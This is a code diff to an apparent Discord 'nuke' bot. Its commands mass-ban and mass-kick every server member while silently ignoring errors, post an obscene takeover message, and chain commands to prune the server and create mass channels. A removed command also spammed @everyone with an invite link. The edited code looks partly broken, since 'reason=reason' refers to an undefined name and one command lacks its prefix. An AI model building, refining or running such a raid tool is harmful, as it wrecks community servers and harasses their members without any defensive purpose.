@@ -617,7 +617,7 @@ async def massban(ctx):
     users = list(ctx.guild.members)
     for user in users:
         try:
-            await user.ban(reason="STEVE PAPA AAYE THE")
+            await user.ban(reason=reason)
         except:
             pass
     await asyncio.sleep(2)
@@ -632,7 +632,7 @@ async def masskick(ctx):
     users = list(ctx.guild.members)
     for user in users:
         try:
-            await user.kick(reason="STEVE PAPA AAYE THE")
+            await user.kick(reason=reason)
         except:
             pass
     await asyncio.sleep(2)
@@ -682,29 +682,14 @@ async def prune(ctx):
 
 #SWIZZ MIXED NUKE CMDS
 @client.command()
-async def swizz(ctx):
-  await ctx.channel.send(f">rr STEVE PAPA AAGYE RANDIO")
-  await asyncio.sleep(2)
+async def nuke(ctx):
   await ctx.channel.send(f">rs SERVER FUCKED BY STEVE PAPA")
   await asyncio.sleep(2)
-  await ctx.channel.send(f">rc STEVE PAPA WAS HERE")
+  await ctx.channel.send(f">prune")
   await asyncio.sleep(2)
-  print(f"{Fore.GREEN}[>] ALL CMDS SENT SUCCESSFUL")
-
-
-#PWIZZ ALL NUKE CMDS MIXED
-@client.command()
-async def pwizz(ctx):
-  await asyncio.sleep(2) 
-  await ctx.channel.send(f">masschannels2")
-  await asyncio.sleep(2) 
-  await ctx.channel.send(f">massban2")
-  await asyncio.sleep(2) 
-  await ctx.channel.send(f">swizz")
-  await asyncio.sleep(2) 
-  await ctx.channel.send(f">pings")
-  await asyncio.sleep(2) 
-  await ctx.channel.send(f">spam 1000 2000 @everyone @here  https://discord.gg/sp1it")
+  await ctx.channel.send(f">mc")
+  await asyncio.sleep(2)
+  await ctx.channel.send(f"mr")
   await asyncio.sleep(2)
   print(f"{Fore.GREEN}[>] ALL CMDS SENT SUCCESSFUL")
 
